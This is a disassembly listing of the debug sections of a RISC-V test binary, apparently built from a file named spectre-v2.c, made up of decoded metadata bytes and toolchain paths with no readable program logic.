 546:	0301                	addi	t1,t1,0
 548:	3a0e                	fld	fs4,224(sp)
 54a:	390b3b0b          	0x390b3b0b
 54e:	1119270b          	0x1119270b
 552:	1201                	addi	tp,tp,-32
 554:	96184007          	flq	ft0,-1695(a6)
 558:	1942                	slli	s2,s2,0x30
 55a:	1301                	addi	t1,t1,-32
 55c:	0000                	unimp
 55e:	0532                	slli	a0,a0,0xc
 560:	0300                	addi	s0,sp,384
 562:	3a0e                	fld	fs4,224(sp)
 564:	390b3b0b          	0x390b3b0b
 568:	0213490b          	0x213490b
 56c:	0018                	0x18
 56e:	3300                	fld	fs0,32(a4)
 570:	0005                	c.nop	1
 572:	0b3a0803          	lb	a6,179(s4)
 576:	0b390b3b          	0xb390b3b
 57a:	1349                	addi	t1,t1,-14
 57c:	1802                	slli	a6,a6,0x20
 57e:	0000                	unimp
 580:	3434                	fld	fa3,104(s0)
 582:	0300                	addi	s0,sp,384
 584:	3a08                	fld	fa0,48(a2)
 586:	390b3b0b          	0x390b3b0b
 58a:	0213490b          	0x213490b
 58e:	0018                	0x18
 590:	3500                	fld	fs0,40(a0)
 592:	0034                	addi	a3,sp,8
 594:	0b3a0803          	lb	a6,179(s4)
 598:	0b390b3b          	0xb390b3b
 59c:	1349                	addi	t1,t1,-14
 59e:	0000                	unimp
 5a0:	0a36                	slli	s4,s4,0xd
 5a2:	0300                	addi	s0,sp,384
 5a4:	3a0e                	fld	fs4,224(sp)
 5a6:	390b3b0b          	0x390b3b0b
 5aa:	0001110b          	0x1110b
 5ae:	3700                	fld	fs0,40(a4)
 5b0:	000a                	c.slli	zero,0x2
 5b2:	0b3a0e03          	lb	t3,179(s4)
 5b6:	0b39053b          	0xb39053b
 5ba:	0111                	addi	sp,sp,4
 5bc:	0000                	unimp
 5be:	2e38                	fld	fa4,88(a2)
 5c0:	0301                	addi	t1,t1,0
 5c2:	3a0e                	fld	fs4,224(sp)
 5c4:	390b3b0b          	0x390b3b0b
 5c8:	4919270b          	0x4919270b
 5cc:	12011113          	0x12011113
 5d0:	97184007          	flq	ft0,-1679(a6)
 5d4:	1942                	slli	s2,s2,0x30
 5d6:	1301                	addi	t1,t1,-32
 5d8:	0000                	unimp
 5da:	2e39                	addiw	t3,t3,14
 5dc:	3f01                	addiw	t5,t5,-32
 5de:	0319                	addi	t1,t1,6
 5e0:	3a0e                	fld	fs4,224(sp)
 5e2:	390b3b0b          	0x390b3b0b
 5e6:	1119270b          	0x1119270b
 5ea:	1201                	addi	tp,tp,-32
 5ec:	96184007          	flq	ft0,-1695(a6)
 5f0:	1942                	slli	s2,s2,0x30
 5f2:	1301                	addi	t1,t1,-32
 5f4:	0000                	unimp
 5f6:	343a                	fld	fs0,424(sp)
 5f8:	0300                	addi	s0,sp,384
 5fa:	3a08                	fld	fa0,48(a2)
 5fc:	390b3b0b          	0x390b3b0b
 600:	8813490b          	0x8813490b
 604:	0b01                	addi	s6,s6,0
 606:	0000                	unimp
 608:	0300343b          	0x300343b
 60c:	3a0e                	fld	fs4,224(sp)
 60e:	390b3b0b          	0x390b3b0b
 612:	0013490b          	0x13490b
 616:	3c00                	fld	fs0,56(s0)
 618:	0034                	addi	a3,sp,8
 61a:	0b3a0803          	lb	a6,179(s4)
 61e:	0b390b3b          	0xb390b3b
 622:	1349                	addi	t1,t1,-14
 624:	0188                	addi	a0,sp,192
 626:	0018020b          	0x18020b
 62a:	3d00                	fld	fs0,56(a0)
 62c:	012e                	slli	sp,sp,0xb
 62e:	0b3a0e03          	lb	t3,179(s4)
 632:	0b390b3b          	0xb390b3b
 636:	0111                	addi	sp,sp,4
 638:	0712                	slli	a4,a4,0x4
 63a:	1840                	addi	s0,sp,52
 63c:	4296                	lw	t0,68(sp)
 63e:	0119                	addi	sp,sp,6
 640:	3e000013          	li	zero,992
 644:	012e                	slli	sp,sp,0xb
 646:	0e03193f 0b3b0b3a 	0xb3b0b3a0e03193f
 64e:	0b39                	addi	s6,s6,14
 650:	01111927          	0x1111927
 654:	0712                	slli	a4,a4,0x4
 656:	1840                	addi	s0,sp,52
 658:	01194297          	auipc	t0,0x1194
 65c:	3f000013          	li	zero,1008
 660:	002e                	c.slli	zero,0xb
 662:	0e03193f 0b3b0b3a 	0xb3b0b3a0e03193f
 66a:	0b39                	addi	s6,s6,14
 66c:	0111                	addi	sp,sp,4
 66e:	0712                	slli	a4,a4,0x4
 670:	1840                	addi	s0,sp,52
 672:	4296                	lw	t0,68(sp)
 674:	0019                	c.nop	6
 676:	4000                	lw	s0,0(s0)
 678:	012e                	slli	sp,sp,0xb
 67a:	0e03193f 0b3b0b3a 	0xb3b0b3a0e03193f
 682:	0b39                	addi	s6,s6,14
 684:	01871927          	0x1871927
 688:	1119                	addi	sp,sp,-26
 68a:	1201                	addi	tp,tp,-32
 68c:	96184007          	flq	ft0,-1695(a6)
 690:	1942                	slli	s2,s2,0x30
 692:	1301                	addi	t1,t1,-32
 694:	0000                	unimp
 696:	2e41                	addiw	t3,t3,16
 698:	3f01                	addiw	t5,t5,-32
 69a:	0319                	addi	t1,t1,6
 69c:	3a0e                	fld	fs4,224(sp)
 69e:	390b3b0b          	0x390b3b0b
 6a2:	8719270b          	0x8719270b
 6a6:	1901                	addi	s2,s2,-32
 6a8:	0111                	addi	sp,sp,4
 6aa:	0712                	slli	a4,a4,0x4
 6ac:	1840                	addi	s0,sp,52
 6ae:	01194297          	auipc	t0,0x1194
 6b2:	42000013          	li	zero,1056
 6b6:	0034                	addi	a3,sp,8
 6b8:	0b3a0e03          	lb	t3,179(s4)
 6bc:	0b390b3b          	0xb390b3b
 6c0:	1349                	addi	t1,t1,-14
 6c2:	0188                	addi	a0,sp,192
 6c4:	0018020b          	0x18020b
 6c8:	4300                	lw	s0,0(a4)
 6ca:	012e                	slli	sp,sp,0xb
 6cc:	0b3a0e03          	lb	t3,179(s4)
 6d0:	0b390b3b          	0xb390b3b
 6d4:	01111927          	0x1111927
 6d8:	0712                	slli	a4,a4,0x4
 6da:	1840                	addi	s0,sp,52
 6dc:	01194297          	auipc	t0,0x1194
 6e0:	44000013          	li	zero,1088
 6e4:	012e                	slli	sp,sp,0xb
 6e6:	0b3a0e03          	lb	t3,179(s4)
 6ea:	0b390b3b          	0xb390b3b
 6ee:	01111927          	0x1111927
 6f2:	0712                	slli	a4,a4,0x4
 6f4:	1840                	addi	s0,sp,52
 6f6:	00194297          	auipc	t0,0x194
	...

Disassembly of section .debug_aranges:

0000000000000000 <.debug_aranges>:
   0:	002c                	addi	a1,sp,8
   2:	0000                	unimp
   4:	0002                	c.slli	zero,0x0
   6:	0000                	unimp
   8:	0000                	unimp
   a:	0008                	0x8
   c:	0000                	unimp
   e:	0000                	unimp
  10:	1048                	addi	a0,sp,36
  12:	8000                	0x8000
  14:	0000                	unimp
  16:	0000                	unimp
  18:	05a2                	slli	a1,a1,0x8
	...
  2e:	0000                	unimp
  30:	002c                	addi	a1,sp,8
  32:	0000                	unimp
  34:	0002                	c.slli	zero,0x0
  36:	0d91                	addi	s11,s11,4
  38:	0000                	unimp
  3a:	0008                	0x8
  3c:	0000                	unimp
  3e:	0000                	unimp
  40:	0000                	unimp
  42:	8000                	0x8000
  44:	0000                	unimp
  46:	0000                	unimp
  48:	01c6                	slli	gp,gp,0x11
	...
  5e:	0000                	unimp
  60:	002c                	addi	a1,sp,8
  62:	0000                	unimp
  64:	0002                	c.slli	zero,0x0
  66:	00000dbf 00000008 	0x800000dbf
  6e:	0000                	unimp
  70:	15ea                	slli	a1,a1,0x3a
  72:	8000                	0x8000
  74:	0000                	unimp
  76:	0000                	unimp
  78:	002e                	c.slli	zero,0xb
	...
  8e:	0000                	unimp
  90:	002c                	addi	a1,sp,8
  92:	0000                	unimp
  94:	0002                	c.slli	zero,0x0
  96:	0ded                	addi	s11,s11,27
  98:	0000                	unimp
  9a:	0008                	0x8
  9c:	0000                	unimp
  9e:	0000                	unimp
  a0:	1618                	addi	a4,sp,800
  a2:	8000                	0x8000
  a4:	0000                	unimp
  a6:	0000                	unimp
  a8:	1214                	addi	a3,sp,288
	...

Disassembly of section .debug_line:

0000000000000000 <.debug_line>:
       0:	00000433          	add	s0,zero,zero
       4:	0002                	c.slli	zero,0x0
       6:	0119                	addi	sp,sp,6
       8:	0000                	unimp
       a:	0101                	addi	sp,sp,0
       c:	000d0efb          	0xd0efb
      10:	0101                	addi	sp,sp,0
      12:	0101                	addi	sp,sp,0
      14:	0000                	unimp
      16:	0100                	addi	s0,sp,128
      18:	0000                	unimp
      1a:	6901                	0x6901
      1c:	636e                	ld	t1,216(sp)
      1e:	7300                	ld	s0,32(a4)
      20:	6372                	ld	t1,280(sp)
      22:	2f00                	fld	fs0,24(a4)
      24:	2f74706f          	j	47b1a <_tbss_end+0x47a96>
      28:	6972                	ld	s2,280(sp)
      2a:	36766373          	csrrsi	t1,0x367,12
      2e:	2f34                	fld	fa3,88(a4)
      30:	6972                	ld	s2,280(sp)
      32:	36766373          	csrrsi	t1,0x367,12
      36:	2d34                	fld	fa3,88(a0)
      38:	6e75                	lui	t3,0x1d
      3a:	776f6e6b          	0x776f6e6b
      3e:	2d6e                	fld	fs10,216(sp)
      40:	6c65                	lui	s8,0x19
      42:	2f66                	fld	ft10,88(sp)
      44:	6e69                	lui	t3,0x1a
      46:	64756c63          	bltu	a0,t2,69e <_tbss_end+0x61a>
      4a:	2f65                	addiw	t5,t5,25
      4c:	616d                	addi	sp,sp,240
      4e:	6e696863          	bltu	s2,t1,73e <_tbss_end+0x6ba>
      52:	0065                	c.nop	25
      54:	74706f2f          	0x74706f2f
      58:	7369722f          	0x7369722f
      5c:	34367663          	bleu	gp,a2,3a8 <_tbss_end+0x324>
      60:	7369722f          	0x7369722f
      64:	34367663          	bleu	gp,a2,3b0 <_tbss_end+0x32c>
      68:	752d                	lui	a0,0xfffeb
      6a:	6b6e                	ld	s6,216(sp)
      6c:	6f6e                	ld	t5,216(sp)
      6e:	652d6e77          	0x652d6e77
      72:	666c                	ld	a1,200(a2)
      74:	636e692f          	0x636e692f
      78:	756c                	ld	a1,232(a0)
      7a:	6564                	ld	s1,200(a0)
      7c:	7379732f          	0x7379732f
      80:	2f00                	fld	fs0,24(a4)
      82:	2f74706f          	j	47b78 <_tbss_end+0x47af4>
      86:	6972                	ld	s2,280(sp)
      88:	36766373          	csrrsi	t1,0x367,12
      8c:	2f34                	fld	fa3,88(a4)
      8e:	696c                	ld	a1,208(a0)
      90:	2f62                	fld	ft10,24(sp)
      92:	2f636367          	0x2f636367
      96:	6972                	ld	s2,280(sp)
      98:	36766373          	csrrsi	t1,0x367,12
      9c:	2d34                	fld	fa3,88(a0)
      9e:	6e75                	lui	t3,0x1d
      a0:	776f6e6b          	0x776f6e6b
      a4:	2d6e                	fld	fs10,216(sp)
      a6:	6c65                	lui	s8,0x19
      a8:	2f66                	fld	ft10,88(sp)
      aa:	2e322e37          	lui	t3,0x2e322
      ae:	2f30                	fld	fa2,88(a4)
      b0:	6e69                	lui	t3,0x1a
      b2:	64756c63          	bltu	a0,t2,70a <_tbss_end+0x686>
      b6:	0065                	c.nop	25
      b8:	6300                	ld	s0,0(a4)
      ba:	6361                	lui	t1,0x18
      bc:	6568                	ld	a0,200(a0)
      be:	682e                	ld	a6,200(sp)
      c0:	0100                	addi	s0,sp,128
      c2:	0000                	unimp
      c4:	63657073          	csrci	0x636,10
      c8:	7274                	ld	a3,224(a2)
      ca:	2d65                	addiw	s10,s10,25
      cc:	3276                	fld	ft4,376(sp)
      ce:	632e                	ld	t1,200(sp)
      d0:	0200                	addi	s0,sp,256
      d2:	0000                	unimp
      d4:	645f 6665 7561      	0x75616665645f
      da:	746c                	ld	a1,232(s0)
      dc:	745f 7079 7365      	0x73657079745f
      e2:	682e                	ld	a6,200(sp)
      e4:	0300                	addi	s0,sp,384
      e6:	0000                	unimp
      e8:	6f6c                	ld	a1,216(a4)
      ea:	682e6b63          	bltu	t3,sp,780 <_tbss_end+0x6fc>
      ee:	0400                	addi	s0,sp,512
      f0:	0000                	unimp
      f2:	745f 7079 7365      	0x73657079745f
      f8:	682e                	ld	a6,200(sp)
      fa:	0400                	addi	s0,sp,512
      fc:	0000                	unimp
      fe:	64647473          	csrrci	s0,0x646,8
     102:	6665                	lui	a2,0x19
     104:	682e                	ld	a6,200(sp)
     106:	0500                	addi	s0,sp,640
     108:	0000                	unimp
     10a:	6572                	ld	a0,280(sp)
     10c:	6e65                	lui	t3,0x19
     10e:	2e74                	fld	fa3,216(a2)
     110:	0068                	addi	a0,sp,12
     112:	0004                	0x4
     114:	5f00                	lw	s0,56(a4)
     116:	69647473          	csrrci	s0,0x696,8
     11a:	746e                	ld	s0,248(sp)
     11c:	682e                	ld	a6,200(sp)
     11e:	0400                	addi	s0,sp,512
     120:	0000                	unimp
     122:	0000                	unimp
     124:	0209                	addi	tp,tp,2
     126:	1048                	addi	a0,sp,36
     128:	8000                	0x8000
     12a:	0000                	unimp
     12c:	0000                	unimp
     12e:	0100c603          	lbu	a2,16(ra) # 4010 <_tbss_end+0x3f8c>
     132:	0e090503          	lb	a0,224(s2) # 65d4 <_tbss_end+0x6550>
     136:	0100                	addi	s0,sp,128
     138:	0a090103          	lb	sp,160(s2)
     13c:	0100                	addi	s0,sp,128
     13e:	0a090203          	lb	tp,160(s2)
     142:	0100                	addi	s0,sp,128
     144:	0a090303          	lb	t1,160(s2)
     148:	0100                	addi	s0,sp,128
     14a:	0c090303          	lb	t1,192(s2)
     14e:	0100                	addi	s0,sp,128
     150:	08090603          	lb	a2,128(s2)
     154:	0100                	addi	s0,sp,128
     156:	04090603          	lb	a2,64(s2)
     15a:	0100                	addi	s0,sp,128
     15c:	14090303          	lb	t1,320(s2)
     160:	0100                	addi	s0,sp,128
     162:	06090303          	lb	t1,96(s2)
     166:	0100                	addi	s0,sp,128
     168:	16090403          	lb	s0,352(s2)
     16c:	0100                	addi	s0,sp,128
     16e:	0200                	addi	s0,sp,256
     170:	0304                	addi	s1,sp,384
     172:	06090303          	lb	t1,96(s2)
     176:	0100                	addi	s0,sp,128
     178:	0200                	addi	s0,sp,256
     17a:	0304                	addi	s1,sp,384
     17c:	0a090403          	lb	s0,160(s2)
     180:	0100                	addi	s0,sp,128
     182:	0200                	addi	s0,sp,256
     184:	0304                	addi	s1,sp,384
     186:	18097903          	0x18097903
     18a:	0100                	addi	s0,sp,128
     18c:	0200                	addi	s0,sp,256
     18e:	0104                	addi	s1,sp,128
     190:	0306                	slli	t1,t1,0x1
     192:	0900                	addi	s0,sp,144
     194:	000a                	c.slli	zero,0x2
     196:	0001                	nop
     198:	0402                	slli	s0,s0,0x0
     19a:	0602                	slli	a2,a2,0x0
     19c:	0a097903          	0xa097903
     1a0:	0100                	addi	s0,sp,128
     1a2:	0200                	addi	s0,sp,256
     1a4:	0104                	addi	s1,sp,128
     1a6:	0306                	slli	t1,t1,0x1
     1a8:	0900                	addi	s0,sp,144
     1aa:	000a                	c.slli	zero,0x2
     1ac:	0601                	addi	a2,a2,0
     1ae:	0c091203          	lh	tp,192(s2)
     1b2:	0100                	addi	s0,sp,128
     1b4:	0204                	addi	s1,sp,256
     1b6:	097faa03          	lw	s4,151(t6) # 4097 <_tbss_end+0x4013>
     1ba:	0008                	0x8
     1bc:	0301                	addi	t1,t1,0
     1be:	0901                	addi	s2,s2,0
     1c0:	0016                	c.slli	zero,0x5
     1c2:	0301                	addi	t1,t1,0
     1c4:	0901                	addi	s2,s2,0
     1c6:	0008                	0x8
     1c8:	0301                	addi	t1,t1,0
     1ca:	0902                	slli	s2,s2,0x0
     1cc:	000a                	c.slli	zero,0x2
     1ce:	0301                	addi	t1,t1,0
     1d0:	0901                	addi	s2,s2,0
     1d2:	0006                	c.slli	zero,0x1
     1d4:	0301                	addi	t1,t1,0
     1d6:	0901                	addi	s2,s2,0
     1d8:	0018                	0x18
     1da:	0301                	addi	t1,t1,0
     1dc:	0901                	addi	s2,s2,0
     1de:	000e                	c.slli	zero,0x3
     1e0:	0301                	addi	t1,t1,0
     1e2:	0901                	addi	s2,s2,0
     1e4:	0014                	0x14
     1e6:	0301                	addi	t1,t1,0
     1e8:	0901                	addi	s2,s2,0
     1ea:	0012                	c.slli	zero,0x4
     1ec:	0301                	addi	t1,t1,0
     1ee:	0902                	slli	s2,s2,0x0
     1f0:	0012                	c.slli	zero,0x4
     1f2:	0301                	addi	t1,t1,0
     1f4:	0901                	addi	s2,s2,0
     1f6:	001a                	c.slli	zero,0x6
     1f8:	0301                	addi	t1,t1,0
     1fa:	0901                	addi	s2,s2,0
     1fc:	0016                	c.slli	zero,0x5
     1fe:	0001                	nop
     200:	0402                	slli	s0,s0,0x0
     202:	0302                	slli	t1,t1,0x0
     204:	00120977          	0x120977
     208:	0001                	nop
     20a:	0402                	slli	s0,s0,0x0
     20c:	0601                	addi	a2,a2,0
     20e:	0a090003          	lb	zero,160(s2)
     212:	0100                	addi	s0,sp,128
     214:	0306                	slli	t1,t1,0x1
     216:	090c                	addi	a1,sp,144
     218:	000c                	0xc
     21a:	0301                	addi	t1,t1,0
     21c:	0906                	slli	s2,s2,0x1
     21e:	0008                	0x8
     220:	0301                	addi	t1,t1,0
     222:	0901                	addi	s2,s2,0
     224:	0006                	c.slli	zero,0x1
     226:	0301                	addi	t1,t1,0
     228:	0901                	addi	s2,s2,0
     22a:	0002                	c.slli	zero,0x0
     22c:	0301                	addi	t1,t1,0
     22e:	0908                	addi	a0,sp,144
     230:	0008                	0x8
     232:	0301                	addi	t1,t1,0
     234:	0901                	addi	s2,s2,0
     236:	000a                	c.slli	zero,0x2
     238:	0301                	addi	t1,t1,0
     23a:	0901                	addi	s2,s2,0
     23c:	002c                	addi	a1,sp,8
     23e:	0301                	addi	t1,t1,0
     240:	0902                	slli	s2,s2,0x0
     242:	0008                	0x8
     244:	0301                	addi	t1,t1,0
     246:	0901                	addi	s2,s2,0
     248:	0008                	0x8
     24a:	0301                	addi	t1,t1,0
     24c:	0901                	addi	s2,s2,0
     24e:	000c                	0xc
     250:	0301                	addi	t1,t1,0
     252:	0902                	slli	s2,s2,0x0
     254:	000c                	0xc
     256:	0301                	addi	t1,t1,0
     258:	0902                	slli	s2,s2,0x0
     25a:	001c                	0x1c
     25c:	0301                	addi	t1,t1,0
     25e:	00040903          	lb	s2,0(s0) # fffffffffffe0000 <_end+0xffffffff7ffc4b40>
     262:	0301                	addi	t1,t1,0
     264:	0901                	addi	s2,s2,0
     266:	000c                	0xc
     268:	0301                	addi	t1,t1,0
     26a:	00180903          	lb	s2,1(a6)
     26e:	0301                	addi	t1,t1,0
     270:	00060903          	lb	s2,0(a2) # 19000 <_tbss_end+0x18f7c>
     274:	0001                	nop
     276:	0402                	slli	s0,s0,0x0
     278:	09010303          	lb	t1,144(sp) # 50b0498 <_tbss_end+0x50b0414>
     27c:	0006                	c.slli	zero,0x1
     27e:	0001                	nop
     280:	0402                	slli	s0,s0,0x0
     282:	097f0303          	lb	t1,151(t5) # fffffffffffef097 <_end+0xffffffff7ffd3bd7>
     286:	0014                	0x14
     288:	0001                	nop
     28a:	0402                	slli	s0,s0,0x0
     28c:	0601                	addi	a2,a2,0
     28e:	0a090003          	lb	zero,160(s2)
     292:	0100                	addi	s0,sp,128
     294:	0306                	slli	t1,t1,0x1
     296:	0905                	addi	s2,s2,1
     298:	000c                	0xc
     29a:	0301                	addi	t1,t1,0
     29c:	00060903          	lb	s2,0(a2)
     2a0:	0301                	addi	t1,t1,0
     2a2:	0902                	slli	s2,s2,0x0
     2a4:	0010                	0x10
     2a6:	0301                	addi	t1,t1,0
     2a8:	0905                	addi	s2,s2,1
     2aa:	0008                	0x8
     2ac:	0301                	addi	t1,t1,0
     2ae:	0901                	addi	s2,s2,0
     2b0:	0016                	c.slli	zero,0x5
     2b2:	0301                	addi	t1,t1,0
     2b4:	0901                	addi	s2,s2,0
     2b6:	0010                	0x10
     2b8:	0301                	addi	t1,t1,0
     2ba:	0902                	slli	s2,s2,0x0
     2bc:	001a                	c.slli	zero,0x6
     2be:	0301                	addi	t1,t1,0
     2c0:	0901                	addi	s2,s2,0
     2c2:	0016                	c.slli	zero,0x5
     2c4:	0301                	addi	t1,t1,0
     2c6:	0901                	addi	s2,s2,0
     2c8:	0016                	c.slli	zero,0x5
     2ca:	0301                	addi	t1,t1,0
     2cc:	0901                	addi	s2,s2,0
     2ce:	0010                	0x10
     2d0:	0301                	addi	t1,t1,0
     2d2:	001a0903          	lb	s2,1(s4)
     2d6:	0001                	nop
     2d8:	0402                	slli	s0,s0,0x0
     2da:	09010303          	lb	t1,144(sp)
     2de:	0006                	c.slli	zero,0x1
     2e0:	0001                	nop
     2e2:	0402                	slli	s0,s0,0x0
     2e4:	097f0303          	lb	t1,151(t5)
     2e8:	0000                	unimp
     2ea:	0001                	nop
     2ec:	0402                	slli	s0,s0,0x0
     2ee:	0601                	addi	a2,a2,0
     2f0:	0a090003          	lb	zero,160(s2)
     2f4:	0100                	addi	s0,sp,128
     2f6:	0200                	addi	s0,sp,256
     2f8:	0204                	addi	s1,sp,256
     2fa:	0306                	slli	t1,t1,0x1
     2fc:	0905                	addi	s2,s2,1
     2fe:	000a                	c.slli	zero,0x2
     300:	0001                	nop
     302:	0402                	slli	s0,s0,0x0
     304:	0302                	slli	t1,t1,0x0
     306:	096c                	addi	a1,sp,156
     308:	0036                	c.slli	zero,0xd
     30a:	0001                	nop
     30c:	0402                	slli	s0,s0,0x0
     30e:	0601                	addi	a2,a2,0
     310:	0a090003          	lb	zero,160(s2)
     314:	0100                	addi	s0,sp,128
     316:	0306                	slli	t1,t1,0x1
     318:	0928                	addi	a0,sp,152
     31a:	0008                	0x8
     31c:	0301                	addi	t1,t1,0
     31e:	0901                	addi	s2,s2,0
     320:	0006                	c.slli	zero,0x1
     322:	0301                	addi	t1,t1,0
     324:	0901                	addi	s2,s2,0
     326:	0010                	0x10
     328:	0301                	addi	t1,t1,0
     32a:	0901                	addi	s2,s2,0
     32c:	001e                	c.slli	zero,0x7
     32e:	0301                	addi	t1,t1,0
     330:	0902                	slli	s2,s2,0x0
     332:	0018                	0x18
     334:	0301                	addi	t1,t1,0
     336:	0901                	addi	s2,s2,0
     338:	000c                	0xc
     33a:	0001                	nop
     33c:	0402                	slli	s0,s0,0x0
     33e:	0302                	slli	t1,t1,0x0
     340:	097a                	slli	s2,s2,0x1e
     342:	0028                	addi	a0,sp,8
     344:	0001                	nop
     346:	0402                	slli	s0,s0,0x0
     348:	0601                	addi	a2,a2,0
     34a:	0a090003          	lb	zero,160(s2)
     34e:	0100                	addi	s0,sp,128
     350:	0200                	addi	s0,sp,256
     352:	0204                	addi	s1,sp,256
     354:	0306                	slli	t1,t1,0x1
     356:	000c0953          	fadd.s	fs2,fs8,ft0,rne
     35a:	0001                	nop
     35c:	0402                	slli	s0,s0,0x0
     35e:	0601                	addi	a2,a2,0
     360:	0a090003          	lb	zero,160(s2)
     364:	0100                	addi	s0,sp,128
     366:	0306                	slli	t1,t1,0x1
     368:	000a093b          	addw	s2,s4,zero
     36c:	0301                	addi	t1,t1,0
     36e:	0902                	slli	s2,s2,0x0
     370:	001c                	0x1c
     372:	0001                	nop
     374:	0402                	slli	s0,s0,0x0
     376:	0601                	addi	a2,a2,0
     378:	1e090003          	lb	zero,480(s2)
     37c:	0100                	addi	s0,sp,128
     37e:	0306                	slli	t1,t1,0x1
     380:	0901                	addi	s2,s2,0
     382:	001e                	c.slli	zero,0x7
     384:	0301                	addi	t1,t1,0
     386:	0901                	addi	s2,s2,0
     388:	0010                	0x10
     38a:	0301                	addi	t1,t1,0
     38c:	097f                	0x97f
     38e:	0014                	0x14
     390:	0301                	addi	t1,t1,0
     392:	0901                	addi	s2,s2,0
     394:	0008                	0x8
     396:	0301                	addi	t1,t1,0
     398:	097f                	0x97f
     39a:	0004                	0x4
     39c:	0301                	addi	t1,t1,0
     39e:	0901                	addi	s2,s2,0
     3a0:	0004                	0x4
     3a2:	0301                	addi	t1,t1,0
     3a4:	097f                	0x97f
     3a6:	0004                	0x4
     3a8:	0301                	addi	t1,t1,0
     3aa:	0902                	slli	s2,s2,0x0
     3ac:	0008                	0x8
     3ae:	0301                	addi	t1,t1,0
     3b0:	097e                	slli	s2,s2,0x1f
     3b2:	0004                	0x4
     3b4:	0301                	addi	t1,t1,0
     3b6:	0902                	slli	s2,s2,0x0
     3b8:	0004                	0x4
     3ba:	0301                	addi	t1,t1,0
     3bc:	097e                	slli	s2,s2,0x1f
     3be:	0004                	0x4
     3c0:	0301                	addi	t1,t1,0
     3c2:	0904                	addi	s1,sp,144
     3c4:	0014                	0x14
     3c6:	0301                	addi	t1,t1,0
     3c8:	0901                	addi	s2,s2,0
     3ca:	0010                	0x10
     3cc:	0301                	addi	t1,t1,0
     3ce:	097f                	0x97f
     3d0:	0014                	0x14
     3d2:	0301                	addi	t1,t1,0
     3d4:	0901                	addi	s2,s2,0
     3d6:	0008                	0x8
     3d8:	0301                	addi	t1,t1,0
     3da:	097f                	0x97f
     3dc:	0004                	0x4
     3de:	0301                	addi	t1,t1,0
     3e0:	0901                	addi	s2,s2,0
     3e2:	0004                	0x4
     3e4:	0301                	addi	t1,t1,0
     3e6:	097f                	0x97f
     3e8:	0004                	0x4
     3ea:	0301                	addi	t1,t1,0
     3ec:	0902                	slli	s2,s2,0x0
     3ee:	0008                	0x8
     3f0:	0301                	addi	t1,t1,0
     3f2:	097e                	slli	s2,s2,0x1f
     3f4:	0004                	0x4
     3f6:	0301                	addi	t1,t1,0
     3f8:	0902                	slli	s2,s2,0x0
     3fa:	0004                	0x4
     3fc:	0301                	addi	t1,t1,0
     3fe:	097e                	slli	s2,s2,0x1f
     400:	0004                	0x4
     402:	0001                	nop
     404:	0402                	slli	s0,s0,0x0
     406:	0302                	slli	t1,t1,0x0
     408:	0905                	addi	s2,s2,1
     40a:	0012                	c.slli	zero,0x4
     40c:	0001                	nop
     40e:	0402                	slli	s0,s0,0x0
     410:	0302                	slli	t1,t1,0x0
     412:	7fb1                	lui	t6,0xfffec
     414:	0a09                	addi	s4,s4,2
     416:	0100                	addi	s0,sp,128
     418:	0200                	addi	s0,sp,256
     41a:	0104                	addi	s1,sp,128
     41c:	0306                	slli	t1,t1,0x1
     41e:	0900                	addi	s0,sp,144
     420:	000a                	c.slli	zero,0x2
     422:	0601                	addi	a2,a2,0
     424:	0900d203          	lhu	tp,144(ra)
     428:	000a                	c.slli	zero,0x2
     42a:	0301                	addi	t1,t1,0
     42c:	0901                	addi	s2,s2,0
     42e:	0002                	c.slli	zero,0x0
     430:	0901                	addi	s2,s2,0
     432:	000a                	c.slli	zero,0x2
     434:	0100                	addi	s0,sp,128
     436:	f401                	bnez	s0,33e <_tbss_end+0x2ba>
     438:	02000003          	lb	zero,32(zero) # 20 <_tdata_begin+0x20>
     43c:	2000                	fld	fs0,0(s0)
     43e:	0000                	unimp
     440:	0100                	addi	s0,sp,128
     442:	fb01                	bnez	a4,352 <_tbss_end+0x2ce>
     444:	0d0e                	slli	s10,s10,0x3
     446:	0100                	addi	s0,sp,128
     448:	0101                	addi	sp,sp,0
     44a:	0001                	nop
     44c:	0000                	unimp
     44e:	0001                	nop
     450:	0100                	addi	s0,sp,128
     452:	00637273          	csrrci	tp,0x6,6
     456:	6300                	ld	s0,0(a4)
     458:	7472                	ld	s0,312(sp)
     45a:	532e                	lw	t1,232(sp)
     45c:	0100                	addi	s0,sp,128
     45e:	0000                	unimp
     460:	0000                	unimp
     462:	0209                	addi	tp,tp,2
     464:	0000                	unimp
     466:	8000                	0x8000
     468:	0000                	unimp
     46a:	0000                	unimp
     46c:	03011103          	lh	sp,48(sp)
     470:	0901                	addi	s2,s2,0
     472:	0002                	c.slli	zero,0x0
     474:	0301                	addi	t1,t1,0
     476:	0901                	addi	s2,s2,0
     478:	0002                	c.slli	zero,0x0
     47a:	0301                	addi	t1,t1,0
     47c:	0901                	addi	s2,s2,0
     47e:	0002                	c.slli	zero,0x0
     480:	0301                	addi	t1,t1,0
     482:	0901                	addi	s2,s2,0
     484:	0002                	c.slli	zero,0x0
     486:	0301                	addi	t1,t1,0
     488:	0901                	addi	s2,s2,0
     48a:	0002                	c.slli	zero,0x0
     48c:	0301                	addi	t1,t1,0
     48e:	0901                	addi	s2,s2,0
     490:	0002                	c.slli	zero,0x0
     492:	0301                	addi	t1,t1,0
     494:	0901                	addi	s2,s2,0
     496:	0002                	c.slli	zero,0x0
     498:	0301                	addi	t1,t1,0
     49a:	0901                	addi	s2,s2,0
     49c:	0002                	c.slli	zero,0x0
     49e:	0301                	addi	t1,t1,0
     4a0:	0901                	addi	s2,s2,0
     4a2:	0002                	c.slli	zero,0x0
     4a4:	0301                	addi	t1,t1,0
     4a6:	0901                	addi	s2,s2,0
     4a8:	0002                	c.slli	zero,0x0
     4aa:	0301                	addi	t1,t1,0
     4ac:	0901                	addi	s2,s2,0
     4ae:	0002                	c.slli	zero,0x0
     4b0:	0301                	addi	t1,t1,0
     4b2:	0901                	addi	s2,s2,0
     4b4:	0002                	c.slli	zero,0x0
     4b6:	0301                	addi	t1,t1,0
     4b8:	0901                	addi	s2,s2,0
     4ba:	0002                	c.slli	zero,0x0
     4bc:	0301                	addi	t1,t1,0
     4be:	0901                	addi	s2,s2,0
     4c0:	0002                	c.slli	zero,0x0
     4c2:	0301                	addi	t1,t1,0
     4c4:	0901                	addi	s2,s2,0
     4c6:	0002                	c.slli	zero,0x0
     4c8:	0301                	addi	t1,t1,0
     4ca:	0901                	addi	s2,s2,0
     4cc:	0002                	c.slli	zero,0x0
     4ce:	0301                	addi	t1,t1,0
     4d0:	0901                	addi	s2,s2,0
     4d2:	0002                	c.slli	zero,0x0
     4d4:	0301                	addi	t1,t1,0
